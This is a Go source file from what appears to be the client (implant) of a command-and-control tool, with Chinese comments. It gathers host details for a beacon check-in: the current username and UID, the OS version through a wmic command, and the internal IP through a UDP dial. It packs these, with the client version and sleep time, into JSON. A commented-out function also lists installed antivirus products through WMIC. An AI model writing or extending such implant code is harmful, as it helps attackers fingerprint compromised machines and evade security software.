package cmd

import (
	"c2_client_go/config"
	"c2_client_go/fuc"
	"encoding/json"
	"errors"
	"net"
	"os/user"
	"strings"
)

type Sysinfo struct {
	//Id         string `json:"id"`
	Uuid       string `json:"uuid"`       //uuid唯一标识
	//Ip         string `json:"ip"`         //上线ip
	Hostname   string `json:"hostname"`   //主机名
	Localip    string `json:"localip"`    //内网ip
	Os         string `json:"os"`         //系统版本
	Av         string `json:"av"`         //杀毒软件
	Version    string `json:"version"`    //上线客户端版本
	Sleep_time string `json:"sleeptime"`  //响应时间
}

func GetInternalIP() (string, error) {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "", errors.New("internal IP fetch failed, detail:" + err.Error())
	}
	defer conn.Close()

	// udp 面向无连接，所以这些东西只在你本地捣鼓
	res := conn.LocalAddr().String()
	res = strings.Split(res, ":")[0]
	return res, nil
}
//func GetAvName() string {
//	ac := fuc.Cmd("WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List")
//	b := strings.Replace(ac, "\n", "", -1)
//	c := strings.Replace(b, "\r", "", -1)
//	Avname := strings.Replace(c, "displayName=", " ", -1)
//	return Avname
//}
func GetSysInfo()(string,string)  {
	//var s Sysinfo
	u, _ := user.Current()
	UserName := strings.Replace(u.Username, "\\", "/", -1)
	Uuid := u.Uid
	//s.Uuid = "G-F-5-21-1574884737-251774687-1439065662-1001"
	//fmt.Println(s.Uuid)
	ac := fuc.Cmd("wmic os get Caption /value")

	b := strings.Replace(ac, "\n", "", -1)
	c := strings.Replace(b, "\r", "", -1)
	SysVersion := strings.Replace(c, "Caption=", "", -1)
	HostIp, _ := GetInternalIP()
	//fmt.Println(s)
	stime:=config.GetSleepTime()
	ss := Sysinfo{Hostname: UserName, Uuid: Uuid, Os: SysVersion,Localip:HostIp,Version:config.Version,Sleep_time: string(stime)}
	buf, _ := json.Marshal(ss)
	//fmt.Println(string(buf))
	return string(buf),Uuid
}
